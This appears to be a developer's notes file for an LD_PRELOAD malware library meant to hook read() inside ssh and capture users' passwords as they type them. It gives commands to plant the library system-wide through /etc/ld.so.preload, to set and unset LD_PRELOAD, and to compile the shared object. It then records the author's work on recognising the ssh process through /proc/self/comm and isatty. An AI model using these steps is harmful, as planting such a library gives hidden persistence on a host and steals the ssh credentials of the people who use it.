# Malware LD_PRELOAD

- Set the ld_preload as global variable systemwide
`echo "$path/fakelib.so" > /etc/ld.so.preload`

- Basic setup to use the malicious lib
`export LD_PRELOAD=$PWD/fakelib.so`
- Delete basic setup to use malicious lib
`unset LD_PRELOAD`
- Command to compile the bad library
`gcc malware.c -fPIC -shared -o fakelib.so`

First we have to confirm that we are called specificly by the ssh procces because if we dont, we will hook any other program running using the read() function.
The first thing i tried was to use "*program_invocation_name" but it did not work as intended. Example output when printing the name of the proccess when running a ssh command.
```
ssh
ssh
IS NOT SSH
ssh
ssh
IS NOT SSH
ssh
ssh
IS NOT SSH
ssh
ssh
IS NOT SSH
sshvictims@172.23.0.2's password:
```
After some research, i found proc man page the /proc/self symlink that resolve to the process own pid directory. https://man7.org/linux/man-pages/man5/proc.5.html
We then can access the /proc/self/comm, to get the name of the command associated with the process
https://man7.org/linux/man-pages/man5/proc_pid_comm.5.html
Now i only get the name of the ssh procces.
After being sure that the correct process is ssh, the idea is to get the ssh password as it is being written by the user. A few tests showed me that what retrieves the ssh password is not inside the process, so nothing is printed when i try.
The solution might be that ssh calls another process, the terminal, to retrieve the data.
One function called isatty allow us to test whether a file descriptor is a terminal or not.
Now i have to figure out how to know that the process that called this process is ssh
